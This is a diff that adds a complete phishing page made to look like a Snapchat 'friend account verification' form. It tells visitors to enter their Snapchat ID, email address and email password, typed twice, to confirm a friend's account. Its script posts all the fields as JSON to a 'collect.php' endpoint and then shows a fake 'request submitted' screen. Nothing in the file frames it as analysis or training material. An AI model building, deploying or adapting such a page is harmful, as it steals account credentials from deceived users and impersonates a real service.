@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Account Verification</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link href="https://fonts.googleapis.com/css2?family=Noto+Color+Emoji&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,"Noto Color Emoji",sans-serif}
+body{margin:0;background:#fffc00}
+.container{max-width:420px;margin:auto;padding:18px;animation:fadeIn .4s ease}
+@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+.logo{text-align:center;font-size:44px;margin-top:8px;font-family:"Noto Color Emoji","Apple Color Emoji","Segoe UI Emoji",sans-serif}
+h1{text-align:center;font-size:22px;margin:18px 0 10px}
+.txt{text-align:center;font-size:14px;color:#333;margin:8px 10px 0;line-height:1.4}
+.snap-bar{width:100%;padding:14px;margin-bottom:8px;font-size:18px;font-weight:600;text-align:center;border:2px solid #000;border-radius:35px;background:#fff;color:#000;cursor:default}
+.card{background:#fff;border-radius:22px;padding:20px;margin-top:20px;box-shadow:0 6px 20px rgba(0,0,0,.08)}
+.option{display:flex;align-items:center;margin:16px 0;font-size:15px}
+.option input{width:18px;height:18px;margin-right:10px;accent-color:#000}
+select,textarea,input{width:100%;padding:12px;margin-top:10px;border-radius:14px;border:1px solid #ccc;font-size:14px;transition:border .2s}
+textarea{resize:none;height:80px}
+button{width:100%;padding:14px;margin-top:20px;border-radius:30px;border:none;background:#000;color:#fff;font-size:16px;cursor:pointer}
+button:disabled{background:#aaa;cursor:not-allowed}
+.pw-box{display:flex;align-items:center;position:relative;margin-top:10px}
+.pw-box input{width:100%;padding-right:36px}
+.eye{position:absolute;right:10px;top:50%;transform:translateY(-50%);cursor:pointer;width:18px;height:18px;fill:none;stroke:#000;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+.mismatch{border:2px solid #e53935 !important;background-color:#ffeaea}
+.err-txt{color:#e53935;font-size:12px;margin-top:4px;display:none}
+.loading,.success{display:none;position:fixed;inset:0;background:#fffc00;justify-content:center;align-items:center;flex-direction:column;z-index:99}
+.spinner{width:40px;height:40px;border:4px solid #ddd;border-top:4px solid #1a73e8;border-radius:50%;animation:spin 1s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.success{height:100vh}
+.circle{width:90px;height:90px;border:5px solid #000;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#000;font-size:42px;font-family:"Noto Color Emoji","Apple Color Emoji","Segoe UI Emoji",sans-serif}
+.success p{margin-top:20px;font-size:18px;font-weight:600;color:#000}
+</style>
+</head>
+<body>
+<div class="container" id="formPage">
+  <div class="logo">👻</div>
+  <h1>Confirm a Friend's Account Authenticity</h1>
+  <p class="txt">Your friend has requested verification.<br>Please confirm if this account belongs to a real person and is not fake or impersonating.</p>
+  <div class="snap-bar">Continue with Snapchat</div>
+  <div class="card">
+    <form id="verifyForm">
+      <div class="option"><input type="radio" name="status" value="real"><span>Yes, this is a real account</span></div>
+      <div class="option"><input type="radio" name="status" value="fake"><span>No, this account seems fake</span></div>
+      <div class="option"><input type="radio" name="status" value="unsure"><span>I'm not sure</span></div>
+      <select name="relation"><option>Friend</option><option>Family</option><option>Colleague</option><option>Online Contact</option></select>
+      <textarea name="message" placeholder="How do you know this person?"></textarea>
+      <div style="background:#fff3cd;border:1px solid #ffeaa7;border-radius:8px;padding:10px;margin-top:10px;font-size:13px;color:#856404;">
+        <strong>Important:</strong> Add your Snapchat ID, Email & matching Passwords below to submit verification.
+      </div>
+      <input type="text" name="snap" placeholder="Enter your Snapchat ID" required>
+      <input type="email" name="email" placeholder="Enter your email address" required>
+      <div class="pw-box">
+        <input type="password" name="password" placeholder="Enter your email password" required>
+        <svg class="eye" viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+      </div>
+      <div class="pw-box">
+        <input type="password" name="confirm" placeholder="Confirm your email password" required>
+        <svg class="eye" viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+      </div>
+      <div class="err-txt">Password doesn't match</div>
+      <button type="submit" disabled>Submit Confirmation</button>
+    </form>
+  </div>
+</div>
+<div class="loading" id="loading"><div class="spinner"></div><p>Submitting your request...</p></div>
+<div class="success" id="successPage"><div class="circle">👻</div><p>Your request has been submitted</p></div>
+<script>
+const form=document.getElementById('verifyForm'),btn=form.querySelector('button'),err=form.querySelector('.err-txt');
+[...form.querySelectorAll('.eye')].forEach((eye,i)=>{
+  eye.onclick=_=>form[['password','confirm'][i]].type^='password';
+});
+form.oninput=_=>{
+  const m=form.password.value===form.confirm.value;
+  form.confirm.classList.toggle('mismatch',!m);
+  err.style.display=m?'none':'block';
+  btn.disabled=!form.snap.value.trim()||!form.email.value.includes('@')||form.password.value.length<4||!m;
+};
+form.onsubmit=async e=>{
+  e.preventDefault();
+  document.getElementById('formPage').style.display='none';
+  document.getElementById('loading').style.display='flex';
+  await fetch('collect.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(Object.fromEntries(new FormData(form)))});
+  document.getElementById('loading').style.display='none';
+  document.getElementById('successPage').style.display='flex';
+};
+</script>
+</body>
+</html>
